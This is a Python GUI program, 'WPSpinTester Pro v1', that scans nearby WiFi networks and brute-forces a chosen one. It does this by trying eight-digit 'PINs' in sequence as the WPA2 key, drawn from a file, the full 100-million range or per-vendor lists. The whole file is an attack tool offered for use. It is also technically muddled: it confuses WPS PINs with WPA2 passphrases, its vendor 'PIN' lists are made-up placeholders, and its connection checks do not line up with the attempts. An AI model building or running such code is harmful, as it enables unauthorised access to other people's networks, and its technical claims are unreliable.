import tkinter as tk
from tkinter import filedialog, messagebox, Scrollbar, Menu
from pywifi import const, PyWiFi, Profile
import threading
import time

class WPSpinTesterProV1GUI:
    def __init__(self, root):
        self.root = root
        self.root.title("WPSpinTester Pro v1")

        # Initialize WiFi interface
        self.wifi = PyWiFi()
        self.iface = self.get_wifi_interface()

        self.create_widgets()
        self.stop_flag = False
        self.thread = None

    def get_wifi_interface(self):
        try:
            iface = self.wifi.interfaces()[0]  # Assumes there's at least one WiFi interface
            return iface
        except IndexError:
            messagebox.showerror("Error", "No WiFi interface found.")
            self.root.quit()

    def create_widgets(self):
        frame = tk.Frame(self.root)
        frame.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)

        self.log_text = tk.Text(frame, height=15, width=60, wrap=tk.WORD, bg="lightgray", font=("Arial", 10))
        self.log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar = Scrollbar(frame, command=self.log_text.yview)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.log_text.config(yscrollcommand=scrollbar.set)

        button_frame = tk.Frame(self.root)
        button_frame.pack(pady=10)

        tk.Button(button_frame, text="Load Custom Payload", command=self.load_custom_payload).pack(side=tk.LEFT, padx=5)
        tk.Button(button_frame, text="Use Default Payload", command=self.use_default_payload).pack(side=tk.LEFT, padx=5)
        tk.Button(button_frame, text="Scan WiFi Networks", command=self.scan_wifi_networks).pack(side=tk.LEFT, padx=5)
        tk.Button(button_frame, text="Connect to Network", command=self.connect_to_network).pack(side=tk.LEFT, padx=5)
        tk.Button(button_frame, text="Stop", command=self.stop_process).pack(side=tk.LEFT, padx=5)

        # Dropdown menu for common router PINs
        self.router_menu_button = tk.Menubutton(button_frame, text="Common Router PINs", relief=tk.RAISED)
        self.router_menu = tk.Menu(self.router_menu_button, tearoff=0)
        self.router_menu_button.config(menu=self.router_menu)

        self.router_menu.add_command(label="D-Link PINs", command=self.load_dlink_pins)
        self.router_menu.add_command(label="TP-Link PINs", command=self.load_tplink_pins)
        self.router_menu.add_command(label="JioFiber PINs", command=self.load_jiofiber_pins)
        self.router_menu.add_command(label="Airtel Fiber PINs", command=self.load_airtel_fiber_pins)
        self.router_menu.add_command(label="BSNL PINs", command=self.load_bsnl_pins)

        self.router_menu_button.pack(side=tk.LEFT, padx=5)

        self.network_listbox = tk.Listbox(self.root, height=10, width=50)
        self.network_listbox.pack(pady=10, padx=10, fill=tk.BOTH, expand=True)

        self.progress_label = tk.Label(self.root, text="Progress: 0%", font=("Arial", 10))
        self.progress_label.pack(pady=5)

    def log(self, message):
        self.log_text.insert(tk.END, message + '\n')
        self.log_text.see(tk.END)

    def update_progress(self, progress):
        self.progress_label.config(text=f"Progress: {progress:.2f}%")

    def load_custom_payload(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
        if file_path:
            with open(file_path, 'r') as file:
                self.pins = file.readlines()
                self.log(f"Loaded {len(self.pins)} PINs.")

    def use_default_payload(self):
        self.pins = [str(i).zfill(8) for i in range(100000000)]
        self.log(f"Using default PINs: {len(self.pins)} PINs.")

    def load_dlink_pins(self):
        self.pins = ['12345678', '12345679', '12345680', '12345681', '12345682']
        self.log(f"Loaded D-Link PINs: {len(self.pins)}")

    def load_tplink_pins(self):
        self.pins = ['12345678', '87654321', '00000000', '11111111', '12345678']
        self.log(f"Loaded TP-Link PINs: {len(self.pins)}")

    def load_jiofiber_pins(self):
        self.pins = ['00000000', '11111111', '12345678', '87654321', '12345678']
        self.log(f"Loaded JioFiber PINs: {len(self.pins)}")

    def load_airtel_fiber_pins(self):
        self.pins = ['00000000', '11111111', '12345678', '87654321', '12345678']
        self.log(f"Loaded Airtel Fiber PINs: {len(self.pins)}")

    def load_bsnl_pins(self):
        self.pins = ['00000000', '11111111', '12345678', '87654321', '12345678']
        self.log(f"Loaded BSNL PINs: {len(self.pins)}")

    def scan_wifi_networks(self):
        self.log("Scanning for networks...")
        self.iface.scan()
        self.root.after(2000, self.list_networks)

    def list_networks(self):
        scan_results = self.iface.scan_results()
        self.network_listbox.delete(0, tk.END)  # Clear the listbox before adding new results
        if scan_results:
            for network in scan_results:
                self.network_listbox.insert(tk.END, network.ssid)
            self.log(f"Found {len(scan_results)} network(s).")
        else:
            self.log("No networks found.")

    def connect_to_network(self):
        selected_network = self.network_listbox.get(tk.ACTIVE)
        if not selected_network:
            messagebox.showwarning("No Network Selected", "Please select a network from the list.")
            return
        
        if not hasattr(self, 'pins') or not self.pins:
            messagebox.showwarning("No PINs", "Please load PINs first.")
            return

        self.stop_flag = False
        self.current_index = 0
        self.selected_network = selected_network
        self.log(f"Starting to try PINs for {selected_network}.")
        self.thread = threading.Thread(target=self.try_pins)
        self.thread.start()

    def try_pins(self):
        total_pins = len(self.pins)
        while not self.stop_flag and self.current_index < total_pins:
            pin = self.pins[self.current_index].strip()
            self.log(f"Trying PIN: {pin}")
            self.connect_to_network_with_pin(pin)
            self.current_index += 1
            progress = (self.current_index / total_pins) * 100
            self.root.after(0, self.update_progress, progress)
            time.sleep(5)  # Adjust delay as needed

        if not self.stop_flag:
            self.log("All PINs tried or process stopped.")

    def connect_to_network_with_pin(self, pin):
        profile = Profile()
        profile.ssid = self.selected_network
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = pin

        self.iface.remove_all_network_profiles()
        tmp_profile = self.iface.add_network_profile(profile)

        self.iface.connect(tmp_profile)
        self.log(f"Attempting to connect with PIN: {pin}...")
        self.root.after(5000, self.check_connection)

    def check_connection(self):
        if self.iface.status() == const.IFACE_CONNECTED:
            self.log("Connected successfully!")
            self.stop_flag = True
        else:
            self.log("Failed to connect. Trying next PIN...")

    def stop_process(self):
        self.stop_flag = True
        if self.thread:
            self.thread.join()
        self.log("Process has been stopped.")

if __name__ == "__main__":
    root = tk.Tk()
    app = WPSpinTesterProV1GUI(root)
    root.mainloop()
